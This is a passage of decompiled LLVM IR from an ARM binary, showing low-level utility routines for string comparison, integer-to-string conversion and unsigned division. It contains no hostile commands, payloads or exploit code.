  br i1 %tmp35, label %dec_label_pc_10f3c, label %dec_label_pc_10ef8

dec_label_pc_10f24:                               ; preds = %bb33
  %v1_10f24 = add i32 %v1_10f04, 1
  %v9_10f28 = icmp eq i32 %v0_10f2821, %v1_10f24
  br i1 %v9_10f28, label %dec_label_pc_10f30, label %dec_label_pc_10eec.backedge

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10f24
  %v2_10f30 = sub i32 %v5_10ef8, %tmp23
  br label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10eec.backedge, %dec_label_pc_10ee4, %dec_label_pc_10f30
  %storemerge = phi i32 [ %v2_10f30, %dec_label_pc_10f30 ], [ -1, %dec_label_pc_10ee4 ], [ -1, %dec_label_pc_10eec.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10f24, { 1, 0 }
  uselistorder i32 %v0_10ef8, { 1, 0 }
  uselistorder i32 %v1_10f04, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 6, 3, 7, 4, 8 }
  uselistorder label %dec_label_pc_10f3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10eec.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10ef8, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10f44 = load i8, i8* %arg1, align 1
  %v2_10f48 = icmp eq i8 %v2_10f44, 0
  br i1 %v2_10f48, label %bb, label %dec_label_pc_10f54

bb:                                               ; preds = %entry
  %v3_10f44 = zext i8 %v2_10f44 to i32
  br label %dec_label_pc_10f68

dec_label_pc_10f54:                               ; preds = %entry
  br label %dec_label_pc_10f58

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f58, %dec_label_pc_10f54
  %v0_10f58 = phi i32 [ %v1_10f58, %dec_label_pc_10f58 ], [ 0, %dec_label_pc_10f54 ]
  %v1_10f58 = add i32 %v0_10f58, 1
  %v2_10f5c = add i32 %v1_10f58, %tmp
  %v3_10f5c = inttoptr i32 %v2_10f5c to i8*
  %v4_10f5c = load i8, i8* %v3_10f5c, align 1
  %v2_10f60 = icmp eq i8 %v4_10f5c, 0
  br i1 %v2_10f60, label %dec_label_pc_10f68, label %dec_label_pc_10f58

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f58, %bb
  %v0_10fb43 = phi i32 [ %v3_10f44, %bb ], [ %v1_10f58, %dec_label_pc_10f58 ]
  %v1_10f68 = inttoptr i32 %arg2 to i8*
  %v2_10f68 = load i8, i8* %v1_10f68, align 1
  %v3_10f68 = zext i8 %v2_10f68 to i32
  store i32 %v3_10f68, i32* @r3, align 4
  %v2_10f6c = icmp eq i8 %v2_10f68, 0
  br i1 %v2_10f6c, label %bb21, label %dec_label_pc_10f78

bb21:                                             ; preds = %dec_label_pc_10f68
  store i32 %v3_10f68, i32* @r2, align 4
  br label %dec_label_pc_10f8c

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f68
  br label %dec_label_pc_10f7c

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f7c, %dec_label_pc_10f78
  %v0_10f7c = phi i32 [ %v1_10f7c, %dec_label_pc_10f7c ], [ 0, %dec_label_pc_10f78 ]
  %v1_10f7c = add i32 %v0_10f7c, 1
  store i32 %v1_10f7c, i32* @r2, align 4
  %v2_10f80 = add i32 %v1_10f7c, %arg2
  %v3_10f80 = inttoptr i32 %v2_10f80 to i8*
  %v4_10f80 = load i8, i8* %v3_10f80, align 1
  %v6_10f80 = zext i8 %v4_10f80 to i32
  store i32 %v6_10f80, i32* @r3, align 4
  %v2_10f84 = icmp eq i8 %v4_10f80, 0
  br i1 %v2_10f84, label %dec_label_pc_10f8c, label %dec_label_pc_10f7c

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f7c, %bb21
  %v0_10f8c = phi i32 [ %v3_10f68, %bb21 ], [ %v1_10f7c, %dec_label_pc_10f7c ]
  %v9_10f8c = icmp eq i32 %v0_10f8c, %v0_10fb43
  br i1 %v9_10f8c, label %dec_label_pc_10fb4.preheader, label %dec_label_pc_10f94

dec_label_pc_10fb4.preheader:                     ; preds = %dec_label_pc_10f8c
  %v2_10fb45 = icmp eq i32 %v0_10fb43, 0
  br i1 %v2_10fb45, label %dec_label_pc_10fbc, label %dec_label_pc_10f9c

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f9c, %dec_label_pc_10f8c
  ret i32 0

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10fac, %dec_label_pc_10fb4.preheader
  %v0_10fb4.in = phi i32 [ %v0_10fb4, %dec_label_pc_10fac ], [ %v0_10fb43, %dec_label_pc_10fb4.preheader ]
  %v0_10fb0 = phi i32 [ %v1_10fb0, %dec_label_pc_10fac ], [ %arg2, %dec_label_pc_10fb4.preheader ]
  %v0_10fac = phi i32 [ %v1_10fac, %dec_label_pc_10fac ], [ %tmp, %dec_label_pc_10fb4.preheader ]
  %v0_10fb4 = add i32 %v0_10fb4.in, -1
  %v1_10f9c = inttoptr i32 %v0_10fac to i8*
  %v2_10f9c = load i8, i8* %v1_10f9c, align 1
  %v3_10f9c = zext i8 %v2_10f9c to i32
  store i32 %v3_10f9c, i32* @r2, align 4
  %v1_10fa0 = inttoptr i32 %v0_10fb0 to i8*
  %v2_10fa0 = load i8, i8* %v1_10fa0, align 1
  %v3_10fa0 = zext i8 %v2_10fa0 to i32
  store i32 %v3_10fa0, i32* @r3, align 4
  %v9_10fa4 = icmp eq i8 %v2_10f9c, %v2_10fa0
  br i1 %v9_10fa4, label %dec_label_pc_10fac, label %dec_label_pc_10f94

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10f9c
  %v1_10fac = add i32 %v0_10fac, 1
  %v1_10fb0 = add i32 %v0_10fb0, 1
  %v2_10fb4 = icmp eq i32 %v0_10fb4, 0
  br i1 %v2_10fb4, label %dec_label_pc_10fbc, label %dec_label_pc_10f9c

dec_label_pc_10fbc:                               ; preds = %dec_label_pc_10fac, %dec_label_pc_10fb4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10f7c, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10f44, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_10fc8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10fc8, i32* %r8.global-to-local, align 4
  %v2_10fc8 = icmp eq i32 %v0_10fc8, 0
  store i1 %v2_10fc8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10fc8, label %dec_label_pc_110a8, label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %entry
  %v3_10fd8 = icmp eq i8 %arg1, 0
  store i1 %v3_10fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10fd8, label %.thread, label %dec_label_pc_10fec

.thread:                                          ; preds = %dec_label_pc_10fd8
  %v4_10fe0 = inttoptr i32 %v0_10fc8 to i8*
  store i8 48, i8* %v4_10fe0, align 1
  %v0_10fe4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10fe4.pr.pr, label %.thread1, label %dec_label_pc_10fec

.thread1:                                         ; preds = %.thread
  %v4_10fe4 = load i32, i32* %r8.global-to-local, align 4
  %v5_10fe4 = add i32 %v4_10fe4, 1
  %v6_10fe4 = inttoptr i32 %v5_10fe4 to i8*
  store i8 0, i8* %v6_10fe4, align 1
  %v0_10fe8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10fe8.pr.pr, label %dec_label_pc_110a8, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10fd8, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_10ff0 = icmp eq i32 %arg2, 10
  store i1 %v7_10ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ff0, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_10fec
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_10fec
  %v4_10fec = zext i1 %tmp48 to i32
  store i32 %v4_10fec, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_110108 = sub nsw i32 0, %tmp
  %tmp.v3_110108 = select i1 %phitmp, i32 %tmp, i32 %v3_110108
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_110108, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_1101c = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_1101c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %bb46, %.thread6
  %v2_11040 = phi i32 [ %v1_1104c, %bb46 ], [ 32, %.thread6 ]
  %v0_11034 = phi i32 [ %v2_11044, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11024 = load i32, i32* %r6.global-to-local, align 4
  %v3_11028 = urem i32 %v0_11034, %v0_11024
  store i32 %v3_11028, i32* %r1.global-to-local, align 4
  %v7_1102c = icmp eq i32 %v3_11028, 9
  store i1 %v7_1102c, i1* %cpsr_z.global-to-local, align 1
  %v1_11030 = add i32 %v3_11028, 48
  store i32 %v0_11034, i32* %r0.global-to-local, align 4
  %v7_11038 = icmp sgt i32 %v3_11028, 9
  %extract.t = trunc i32 %v1_11030 to i8
  br i1 %v7_11038, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11020
  %v9_11038 = add i32 %v3_11028, 55
  %extract.t28 = trunc i32 %v9_11038 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11020, %bb45
  %v0_11040.off0 = phi i8 [ %extract.t, %dec_label_pc_11020 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11024, i32* %r1.global-to-local, align 4
  %v3_11040 = load i32, i32* %r7.global-to-local, align 4
  %v4_11040 = add i32 %v3_11040, %v2_11040
  %v5_11040 = inttoptr i32 %v4_11040 to i8*
  store i8 %v0_11040.off0, i8* %v5_11040, align 1
  %v0_11044 = load i32, i32* %r0.global-to-local, align 4
  %v1_11044 = load i32, i32* %r1.global-to-local, align 4
  %v2_11044 = udiv i32 %v0_11044, %v1_11044
  store i32 %v2_11044, i32* %r0.global-to-local, align 4
  %v2_11048 = icmp ugt i32 %v1_11044, %v0_11044
  store i1 %v2_11048, i1* %cpsr_z.global-to-local, align 1
  %v0_1104c = load i32, i32* %r5.global-to-local, align 4
  %v1_1104c = add i32 %v0_1104c, -1
  store i32 %v1_1104c, i32* %r5.global-to-local, align 4
  br i1 %v2_11048, label %dec_label_pc_11054, label %dec_label_pc_11020

dec_label_pc_11054:                               ; preds = %bb46
  %v0_11054 = load i32, i32* %sl.global-to-local, align 4
  %v2_11054 = icmp eq i32 %v0_11054, 0
  store i1 %v2_11054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11054, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11054
  %v3_11058 = ptrtoint i32* %stack_var_-32 to i32
  %v3_1105c = add i32 %v1_1104c, %v3_11058
  store i32 %v3_1105c, i32* %r2.global-to-local, align 4
  %v4_11064 = add i32 %v3_1105c, -34
  %v5_11064 = inttoptr i32 %v4_11064 to i8*
  store i8 45, i8* %v5_11064, align 1
  %v0_11068.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11068.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_11068.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11054
  %v1_11068 = phi i32 [ %v1_1104c, %dec_label_pc_11054 ], [ %v1_11068.pre, %.thread11 ]
  %v2_11068 = add i32 %v1_11068, 1
  store i32 %v2_11068, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_11074 = phi i32 [ %v2_11068, %.thread12 ], [ %v1_11068.pre, %.thread11 ]
  %v0_1106c = load i32, i32* %r7.global-to-local, align 4
  %v2_1106c = add i32 %v0_1106c, %v1_11074
  %v3_1106c = inttoptr i32 %v2_1106c to i8*
  %v4_1106c = load i8, i8* %v3_1106c, align 1
  %v6_1106c = zext i8 %v4_1106c to i32
  %v2_11070 = icmp eq i8 %v4_1106c, 0
  store i1 %v2_11070, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1106c, i32* %r2.global-to-local, align 4
  br i1 %v2_11070, label %dec_label_pc_110b8, label %dec_label_pc_11080.preheader

dec_label_pc_11080.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11080

dec_label_pc_11080:                               ; preds = %dec_label_pc_11080.preheader, %dec_label_pc_11080
  %v0_11080 = phi i32 [ 0, %dec_label_pc_11080.preheader ], [ %v1_11080, %dec_label_pc_11080 ]
  %v1_11080 = add i32 %v0_11080, 1
  store i32 %v1_11080, i32* %r1.global-to-local, align 4
  %v2_11084 = add i32 %v1_11080, %v2_1106c
  %v3_11084 = inttoptr i32 %v2_11084 to i8*
  %v4_11084 = load i8, i8* %v3_11084, align 1
  %v2_11088 = icmp eq i8 %v4_11084, 0
  store i1 %v2_11088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11088, label %dec_label_pc_11090, label %dec_label_pc_11080

dec_label_pc_11090:                               ; preds = %dec_label_pc_11080, %dec_label_pc_110b8
  %v0_1109425 = phi i32 [ %v6_1106c, %dec_label_pc_110b8 ], [ %v1_11080, %dec_label_pc_11080 ]
  %v0_11090 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11090, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11094

dec_label_pc_11094:                               ; preds = %dec_label_pc_11094.dec_label_pc_11094_crit_edge, %dec_label_pc_11090
  %v2_110a0 = phi i32 [ %v5_110a0, %dec_label_pc_11094.dec_label_pc_11094_crit_edge ], [ %v0_11090, %dec_label_pc_11090 ]
  %v0_11098 = phi i32 [ %v0_11098.pre, %dec_label_pc_11094.dec_label_pc_11094_crit_edge ], [ %v2_1106c, %dec_label_pc_11090 ]
  %v0_11094 = phi i32 [ %v0_11094.pre, %dec_label_pc_11094.dec_label_pc_11094_crit_edge ], [ %v0_1109425, %dec_label_pc_11090 ]
  %v1_11094 = add i32 %v0_11094, -1
  store i32 %v1_11094, i32* %r1.global-to-local, align 4
  %v1_11098 = inttoptr i32 %v0_11098 to i8*
  %v2_11098 = load i8, i8* %v1_11098, align 1
  %v5_11098 = add i32 %v0_11098, 1
  store i32 %v5_11098, i32* %r2.global-to-local, align 4
  %v3_1109c = icmp eq i32 %v0_11094, 0
  store i1 %v3_1109c, i1* %cpsr_z.global-to-local, align 1
  %v3_110a0 = inttoptr i32 %v2_110a0 to i8*
  store i8 %v2_11098, i8* %v3_110a0, align 1
  %v4_110a0 = load i32, i32* %r0.global-to-local, align 4
  %v5_110a0 = add i32 %v4_110a0, 1
  store i32 %v5_110a0, i32* %r0.global-to-local, align 4
  br i1 %v3_1109c, label %dec_label_pc_110a8, label %dec_label_pc_11094.dec_label_pc_11094_crit_edge

dec_label_pc_11094.dec_label_pc_11094_crit_edge:  ; preds = %dec_label_pc_11094
  %v0_11094.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11098.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11094

dec_label_pc_110a8:                               ; preds = %dec_label_pc_11094, %.thread1, %entry
  %v0_110a8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_110a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_110a8

dec_label_pc_110b8:                               ; preds = %.thread11._crit_edge
  store i32 %v6_1106c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11090

; uselistorder directives
  uselistorder i32 %v5_110a0, { 1, 0 }
  uselistorder i1 %v3_1109c, { 1, 0 }
  uselistorder i32 %v0_11098, { 1, 0 }
  uselistorder i32 %v1_11080, { 0, 1, 3, 2 }
  uselistorder i32 %v6_1106c, { 1, 0 }
  uselistorder i32 %v2_1106c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11068.pre, { 1, 0 }
  uselistorder i32 %v1_1104c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11044, { 1, 0 }
  uselistorder i32 %v3_11028, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10fc8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11090, { 1, 0 }
  uselistorder label %dec_label_pc_11080, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_10fec, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_110c0 = load i32, i32* @r1, align 4
  %v1_110c0 = add i32 %v0_110c0, -1
  store i32 %v1_110c0, i32* %r2.global-to-local, align 4
  %v2_110c0 = icmp eq i32 %v0_110c0, 0
  %v7_110c0 = icmp eq i32 %v0_110c0, 1
  %v0_110c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_110c0, i32 %v0_110c4)
  br i1 %v2_110c0, label %dec_label_pc_111a8, label %dec_label_pc_110cc

dec_label_pc_110cc:                               ; preds = %entry
  %v0_110cc = load i32, i32* %r0.global-to-local, align 4
  %v1_110cc = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_110cc, %v1_110cc
  br i1 %tmp, label %dec_label_pc_110d4, label %dec_label_pc_11160

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110cc
  %v1_110d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_110d4 = and i32 %v1_110d4, %v1_110cc
  %v4_110d4 = icmp eq i32 %v2_110d4, 0
  br i1 %v4_110d4, label %dec_label_pc_1116c, label %dec_label_pc_110dc

dec_label_pc_110dc:                               ; preds = %dec_label_pc_110d4
  %v3_110dc = icmp ult i32 %v1_110cc, 536870912
  br i1 %v3_110dc, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_110dc
  %v4_110e0 = mul i32 %v1_110cc, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_110dc, %.thread
  %v0_11100.pr36.ph = phi i32 [ %v4_110e0, %.thread ], [ %v1_110cc, %dec_label_pc_110dc ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_110dc ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11100.pr36 = phi i32 [ %v4_110f4, %bb81 ], [ %v0_11100.pr36.ph, %.preheader.preheader ]
  %v1_110f8 = phi i32 [ %v4_110f8, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_110ec = icmp ugt i32 %v0_11100.pr36, 268435455
  br i1 %v2_110ec, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11100thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_110f0 = icmp ult i32 %v0_11100.pr36, %v0_110cc
  br i1 %v4_110f0, label %bb80, label %dec_label_pc_11100thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_110f4 = and i32 %v0_11100.pr36, 268435456
  %v3_110f4 = icmp eq i32 %v2_110f4, 0
  %v4_110f4 = mul i32 %v0_11100.pr36, 16
  br i1 %v3_110f4, label %bb81, label %dec_label_pc_11100.loopexit

bb81:                                             ; preds = %bb80
  %v2_110f8 = and i32 %v1_110f8, 268435456
  %v3_110f8 = icmp eq i32 %v2_110f8, 0
  %v4_110f8 = mul i32 %v1_110f8, 16
  br i1 %v3_110f8, label %.preheader, label %dec_label_pc_11100thread-pre-split.loopexit.loopexit

dec_label_pc_11100thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1110c48.ph = phi i32 [ %v1_110f8, %bb ], [ %v4_110f8, %bb81 ]
  %v0_11100.pr38.ph = phi i32 [ %v0_11100.pr36, %bb ], [ %v4_110f4, %bb81 ]
  br label %dec_label_pc_11100thread-pre-split.loopexit

dec_label_pc_11100thread-pre-split.loopexit:      ; preds = %dec_label_pc_11100thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1110c48 = phi i32 [ %v1_110f8, %.thread2 ], [ %v1_1110c48.ph, %dec_label_pc_11100thread-pre-split.loopexit.loopexit ]
  %v0_11100.pr38 = phi i32 [ %v0_11100.pr36, %.thread2 ], [ %v0_11100.pr38.ph, %dec_label_pc_11100thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11100thread-pre-split

dec_label_pc_11100thread-pre-split:               ; preds = %dec_label_pc_11100thread-pre-split.loopexit, %bb83
  %v1_1110c46 = phi i32 [ %v1_1110c48, %dec_label_pc_11100thread-pre-split.loopexit ], [ %v3_1110c, %bb83 ]
  %v0_11100.pr = phi i32 [ %v0_11100.pr38, %dec_label_pc_11100thread-pre-split.loopexit ], [ %v3_11108, %bb83 ]
  br label %dec_label_pc_11100

dec_label_pc_11100.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_11100.loopexit, %dec_label_pc_11100thread-pre-split
  %v1_1110c = phi i32 [ %v1_1110c46, %dec_label_pc_11100thread-pre-split ], [ %v1_110f8, %dec_label_pc_11100.loopexit ]
  %v1_11108 = phi i32 [ %v0_11100.pr, %dec_label_pc_11100thread-pre-split ], [ %v4_110f4, %dec_label_pc_11100.loopexit ]
  %v2_11100 = icmp slt i32 %v1_11108, 0
  br i1 %v2_11100, label %dec_label_pc_11114, label %bb82

bb82:                                             ; preds = %dec_label_pc_11100
  %v4_11104 = icmp ult i32 %v1_11108, %v0_110cc
  br i1 %v4_11104, label %bb83, label %dec_label_pc_11114

bb83:                                             ; preds = %bb82
  %v3_11108 = mul i32 %v1_11108, 2
  %v2_1110c = icmp slt i32 %v1_1110c, 0
  %v3_1110c = mul i32 %v1_1110c, 2
  br i1 %v2_1110c, label %dec_label_pc_11114, label %dec_label_pc_11100thread-pre-split

dec_label_pc_11114:                               ; preds = %bb82, %dec_label_pc_11100, %bb83
  %v2_1112059 = phi i32 [ %v3_1110c, %bb83 ], [ %v1_1110c, %bb82 ], [ %v1_1110c, %dec_label_pc_11100 ]
  %v1_1111851 = phi i32 [ %v3_11108, %bb83 ], [ %v1_11108, %bb82 ], [ %v1_11108, %dec_label_pc_11100 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %.thread11, %dec_label_pc_11114
  %v1_1114c = phi i32 [ %v4_1114c, %.thread11 ], [ %v2_1112059, %dec_label_pc_11114 ]
  %v1_11120 = phi i32 [ %v0_11158, %.thread11 ], [ 0, %dec_label_pc_11114 ]
  %v1_11150 = phi i32 [ %v4_11150, %.thread11 ], [ %v1_1111851, %dec_label_pc_11114 ]
  %v1_1111c = phi i32 [ %v0_11148, %.thread11 ], [ %v0_110cc, %dec_label_pc_11114 ]
  %v3_11118 = icmp ult i32 %v1_1111c, %v1_11150
  br i1 %v3_11118, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11118
  %v3_1111c = sub i32 %v1_1111c, %v1_11150
  store i32 %v3_1111c, i32* %r0.global-to-local, align 4
  %v3_11120 = or i32 %v1_11120, %v1_1114c
  store i32 %v3_11120, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11118, %bb84
  %v1_11128 = phi i32 [ %v1_1111c, %dec_label_pc_11118 ], [ %v3_1111c, %bb84 ]
  %v1_1112c = phi i32 [ %v1_11120, %dec_label_pc_11118 ], [ %v3_11120, %bb84 ]
  %v4_11124 = udiv i32 %v1_11150, 2
  %v6_11124 = icmp ult i32 %v1_11128, %v4_11124
  br i1 %v6_11124, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11128 = urem i32 %v1_11150, 2
  %v4_11128 = icmp eq i32 %v3_11128, 0
  %v6_11128 = sub i32 %v1_11128, %v4_11124
  store i32 %v6_11128, i32* %r0.global-to-local, align 4
  br i1 %v4_11128, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_1112c = udiv i32 %v1_1114c, 2
  %v6_1112c = or i32 %v1_1112c, %v5_1112c
  store i32 %v6_1112c, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11134 = phi i32 [ %v6_11128, %bb85 ], [ %v1_11128, %.thread7 ], [ %v6_11128, %bb86 ]
  %v1_11138 = phi i32 [ %v1_1112c, %bb85 ], [ %v1_1112c, %.thread7 ], [ %v6_1112c, %bb86 ]
  %v4_11130 = udiv i32 %v1_11150, 4
  %v6_11130 = icmp ult i32 %v1_11134, %v4_11130
  br i1 %v6_11130, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11134 = and i32 %v1_11150, 2
  %v4_11134 = icmp eq i32 %v3_11134, 0
  %v6_11134 = sub i32 %v1_11134, %v4_11130
  store i32 %v6_11134, i32* %r0.global-to-local, align 4
  br i1 %v4_11134, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11138 = udiv i32 %v1_1114c, 4
  %v6_11138 = or i32 %v1_11138, %v5_11138
  store i32 %v6_11138, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11140 = phi i32 [ %v6_11134, %bb87 ], [ %v1_11134, %.thread8 ], [ %v6_11134, %bb88 ]
  %v1_11144 = phi i32 [ %v1_11138, %bb87 ], [ %v1_11138, %.thread8 ], [ %v6_11138, %bb88 ]
  %v4_1113c = udiv i32 %v1_11150, 8
  %v6_1113c = icmp ult i32 %v1_11140, %v4_1113c
  br i1 %v6_1113c, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11140 = and i32 %v1_11150, 4
  %v4_11140 = icmp eq i32 %v3_11140, 0
  %v6_11140 = sub i32 %v1_11140, %v4_1113c
  store i32 %v6_11140, i32* %r0.global-to-local, align 4
  br i1 %v4_11140, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11144 = udiv i32 %v1_1114c, 8
  %v6_11144 = or i32 %v1_11144, %v5_11144
  store i32 %v6_11144, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11158 = phi i32 [ %v1_11144, %bb89 ], [ %v1_11144, %.thread9 ], [ %v6_11144, %bb90 ]
  %v0_11148 = phi i32 [ %v6_11140, %bb89 ], [ %v1_11140, %.thread9 ], [ %v6_11140, %bb90 ]
  %v2_11148 = icmp eq i32 %v0_11148, 0
  br i1 %v2_11148, label %dec_label_pc_11158, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_1114c, 16
  br i1 %tmp138, label %dec_label_pc_11158, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_1114c = udiv i32 %v1_1114c, 16
  %v4_11150 = udiv i32 %v1_11150, 16
  br label %dec_label_pc_11118

dec_label_pc_11158:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11158, i32* %r0.global-to-local, align 4
  ret i32 %v0_11158

dec_label_pc_11160:                               ; preds = %dec_label_pc_110cc
  %v9_110cc = icmp eq i32 %v0_110cc, %v1_110cc
  %. = zext i1 %v9_110cc to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_1116c:                               ; preds = %dec_label_pc_110d4
  %v2_1116c = icmp ugt i32 %v1_110cc, 65535
  br i1 %v2_1116c, label %bb95, label %.thread16

